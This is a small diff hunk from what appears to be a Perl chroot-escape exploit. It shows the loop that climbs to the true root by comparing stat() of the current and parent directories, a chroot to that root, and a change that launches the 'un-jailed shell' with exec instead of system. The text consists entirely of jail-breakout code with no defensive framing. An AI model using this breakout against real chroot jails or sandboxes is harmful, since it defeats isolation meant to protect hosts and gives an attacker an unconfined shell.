@@ -30,4 +30,4 @@ while ((stat("."))[0] != (stat(".."))[0] or (stat("."))[1] != (stat(".."))[1]) {
 chroot ".";
 
 # Start an un-jailed shell
-system("/bin/sh");
+exec "/bin/sh";
